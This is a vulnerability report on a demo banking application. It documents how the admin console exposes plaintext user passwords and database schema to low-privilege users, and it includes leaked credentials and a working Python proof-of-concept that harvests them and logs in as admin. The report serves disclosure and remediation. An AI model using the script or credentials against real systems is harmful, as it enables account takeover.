# Plaintext credential and database schema disclosure in the admin console user list

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-09-20 21:44:56 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /admin/admin.jsp
**Method:** GET
**CWE:** CWE-522
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The administrator console page `/admin/admin.jsp`, reachable by any authenticated low-privilege user, renders a user-selection `<select>` whose option values contain the plaintext `username:password:role` of every account in the `PEOPLE` table, together with database schema metadata. The disclosed passwords are the actual stored secrets: the leaked administrator credential authenticates successfully and grants access to the admin console, while the account's documented default password does not work.

## Evidence

The admin console returns the user list with plaintext credentials embedded in option values (HTTP 200, `Content-Length: 29668`, retrieved with a low-privilege `jsmith` session):

```html
<select name="username" id="username" size="1">
  <option value="pdata1admin:admin_hacked:admin">pdata1admin:admin_hacked:admin</option>
  <option value="pd2_13jsmith:demo1234:user">pd2_13jsmith:demo1234:user</option>
  <option value="psspeedsspeed:Speed123!:user">psspeedsspeed:Speed123!:user</option>
  <option value="pjsmithjsmith:demo1234:user">pjsmithjsmith:demo1234:user</option>
  ...
</select>
```

The same response discloses database schema identifiers and account records:

```html
<option value="pcol3PASSWORD">pcol3PASSWORD</option>
<option value="pcol5TOTP_SECRET">pcol5TOTP_SECRET</option>
<option value="pcol4ROLE">pcol4ROLE</option>
<option value="tbl2PEOPLE">tbl2PEOPLE</option>
<option value="tbl22SYSTABLES">tbl22SYSTABLES</option>
<option value="acol2BALANCE">acol2BALANCE</option>
<option value="eac6800006              :Savings:69104.0          ">eac6800006              :Savings:69104.0          </option>
```

The leaked administrator credential authenticates, while the documented default does not:

```
POST /doLogin  uid=admin&passw=admin_hacked  ->  302 Found  Location: /bank/main.jsp
GET  /admin/admin.jsp (as admin)             ->  200 OK
POST /doLogin  uid=admin&passw=admin         ->  302 Found  Location: login.jsp   (rejected)
```

The API login response confirms the password is the stored secret — the returned token is the application's `base64(base64(user):base64(password))` form, decoding to `admin:admin_hacked`:

```
POST /api/login {"username":"admin","password":"admin_hacked"}
-> {"Authorization":"WVdSdGFXND06WVdSdGFXNWZhR0ZqYTJWazo/Pz8/ITE=","success":"admin is now logged in"}
```

Independent positive control for live data: after creating an account through the console, its identifier appeared in the same dropdown on the next request; the list also contains accounts created earlier in the current test window.

## Impact

An authenticated low-privilege user obtains the plaintext passwords of all user accounts exposed by the console, including a valid administrator credential. The leaked `admin` credential authenticates successfully against the application (the documented default `admin`/`admin` does not), giving the attacker control of the administrative account and the privileged functions it can reach. The response additionally discloses internal database structure (table names, including Apache Derby `SYS.*` metadata tables, and column names such as `PASSWORD`, `TOTP_SECRET`, `ROLE`, `ACCOUNT_ID`, `BALANCE`) and live account records (account identifiers, names and balances), which lowers the effort required for further authorization and injection attacks. Because the passwords are returned in cleartext, this confirms they are not stored with an adaptive hash, so any database compromise yields directly reusable credentials.

## Counterevidence

The strongest argument against this finding is that the target is a public, intentionally vulnerable demo application whose data is synthetic, so no real customer financial data is exposed and the business impact is limited; this is reflected in the Medium rating. A second argument is that the page requires an authenticated session, which is why the vector uses `PR:L` rather than `PR:N`. A third is that a separate authorization defect already allows any logged-in user to invoke administrative functions, so obtaining the `admin` credential adds less marginal privilege than it would on a hardened deployment; that weakness was confirmed independently (both the `jsmith` session and the `admin` session return HTTP 200 from `/admin/admin.jsp`, `/admin/feedbackreview.jsp` and accept `POST /admin/addUser`).

Placeholders or static demo strings were actively ruled out. The leaked `admin` password `admin_hacked` authenticates successfully, whereas the account's documented default password `admin` is rejected — a negative control showing the leaked value is the genuine, non-default secret. The leaked `jsmith` value `demo1234` matches the account's independently verified working password. The credential set changes with database state: it contains accounts created during the current test window, and a newly created account appeared in the dropdown immediately afterwards. Finally, the API authorization token returned by `/api/login` decodes to `admin:admin_hacked`, confirming the value is used by the authentication logic and is not a display artifact.

## What Would Change This Severity

Confirmation that the same administrator password (or the other disclosed passwords) is reused on a production or non-demo system, or proof that the page is reachable without any authentication, would raise the severity; evidence that the exposed accounts are confined to a synthetic demo instance with no downstream reuse keeps it at the current level.

## Technical Analysis

`GET /admin/admin.jsp` builds a user dropdown by iterating over the application's user records and writing each record into an `<option>` element. Instead of emitting only the account identifier, the rendered option value concatenates the user identifier, the plaintext password and the role (for example `pdata1admin:admin_hacked:admin` and `pd2_13jsmith:demo1234:user`). The same response also emits database metadata as options: table names (`tbl2PEOPLE`, `tbl0ACCOUNTS`, `tbl25TRANSACTIONS`, `tbl1FEEDBACK`, plus Derby `SYS.*` catalog tables) and column names for the `PEOPLE` table (`pcol0FIRST_NAME`, `pcol3PASSWORD`, `pcol4ROLE`, `pcol5TOTP_SECRET`, `pcol6USER_ID`) and the `ACCOUNTS` table (`acol0ACCOUNT_ID`, `acol2BALANCE`, `acol3USERID`).

Two properties make the exposure severe. First, the leaked password values are the real secrets rather than labels: the `admin` password `admin_hacked` authenticates successfully, and the `jsmith` value `demo1234` matches the account's known working password. Second, the affected page requires only an authenticated session, not an administrative role: the request was performed with a `jsmith` session, so any user who can log in can harvest every credential. The credential list also tracks live database state — it contains accounts created during the current test window (for example `hackerman`, `hacktest456`, `jsmith_hack`, `i019_test_1783661487`, `adduser_baseline`), and a newly created account appeared in the list immediately after creation, confirming the values are read from the database at request time rather than being a static demo artifact.

## Proof of Concept

1. Authenticate to the application with a low-privilege account by submitting `uid` and `passw` to `POST /doLogin`; a successful login redirects to `/bank/main.jsp` and sets a `JSESSIONID` cookie.
2. Request `GET /admin/admin.jsp` with that session and confirm the response is HTTP 200.
3. Extract every `<option value="...">` whose value has the form `username:password:role`. The extracted set includes the administrative account `admin` with password `admin_hacked` (role `admin`).
4. Authenticate to the application with the leaked `admin` / `admin_hacked` credential and confirm the login is accepted and `/admin/admin.jsp` is reachable.
5. Compare against the account's documented default password: `admin` / `admin` is rejected, confirming the leaked value is the genuine stored secret. All requests are read-only; the final step only authenticates.

```python
#!/usr/bin/env python3
"""PoC: plaintext credential disclosure in /admin/admin.jsp.

Flow: authenticate as a low-privilege user, retrieve the admin console,
harvest username:password:role triples from the user <select>, then
authenticate with the leaked administrator credential to prove it is valid.
"""
import re
import sys
import requests

BASE = "http://demo.testfire.net"


def login(session, user, password):
    resp = session.post(
        BASE + "/doLogin",
        data={"uid": user, "passw": password, "btnSubmit": "Login"},
        allow_redirects=False,
    )
    return resp.status_code == 302 and "bank/main.jsp" in resp.headers.get("Location", "")


def main():
    # 1. Attacker's own low-privilege session.
    attacker = requests.Session()
    if not login(attacker, "jsmith", "demo1234"):
        sys.exit("[-] low-privilege login failed")
    print("[+] authenticated as low-privilege user 'jsmith'")

    # 2. Retrieve the admin console (only login required, no admin role).
    page = attacker.get(BASE + "/admin/admin.jsp").text
    print(f"[+] GET /admin/admin.jsp -> {len(page)} bytes")

    # 3. Harvest leaked username:password:role triples.
    triples = sorted({
        v for v in re.findall(r'<option value="([^"]*:[^"]*:[^"]*)"', page)
        if not re.search(r"(eac|acol|pcol|tbl)", v)
    })
    print(f"[+] {len(triples)} credential triples leaked:")
    for t in triples:
        print("      " + t)

    admin_pw = None
    for t in triples:
        if t.endswith(":admin") and "admin" in t:
            admin_pw = t.split(":")[1]
    if not admin_pw:
        sys.exit("[-] no administrator credential leaked")

    # 4. Prove the leaked administrator credential is valid.
    adm = requests.Session()
    ok = login(adm, "admin", admin_pw)
    print(f"[{'*' if ok else '-'}] login with leaked admin password "
          f"'{admin_pw}': {'SUCCESS' if ok else 'FAILED'}")
    if ok:
        print("[+] admin console as leaked admin:",
              adm.get(BASE + "/admin/admin.jsp").status_code)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
```

## Remediation

1. Remove password values from every server-rendered view. The user-selection control should carry only an opaque account identifier as its option value and only a non-sensitive label (username or display name) as its text.
2. Never serialize credential fields into HTML. Apply a strict output contract (for example a DTO/allow-list) when populating administrative dropdowns so that `PASSWORD`, `TOTP_SECRET` and other secret columns cannot reach the response, even if the underlying query selects them.
3. Stop storing passwords recoverably. Store adaptive salted hashes (bcrypt, scrypt, Argon2 or PBKDF2) and compare with a constant-time verification function. If any password was stored or transmitted in cleartext in this system, treat the credential set as compromised and rotate every affected account, including the administrator account.
4. Restrict the administrative console to administrators. Require an explicit administrative authorization check on `/admin/*` rather than authentication alone, so exposure of an authenticated session does not equate to administrative read access.
5. Remove schema metadata from application responses and avoid returning database catalog rows or column names to the client; log detailed database errors server-side only.
6. Add regression coverage that asserts no response body from an administrative page contains password-like values or schema identifiers.

## Assumptions

Assumes the attacker can obtain any valid low-privilege session; the application ships a documented demo credential (`jsmith` / `demo1234`) that was used here, so this precondition is trivially met. The disclosure is read-only and requires no administrative role. The application is an intentionally vulnerable public demo containing synthetic data, which limits real-world business impact but does not reduce the demonstrated technical impact on this deployment.
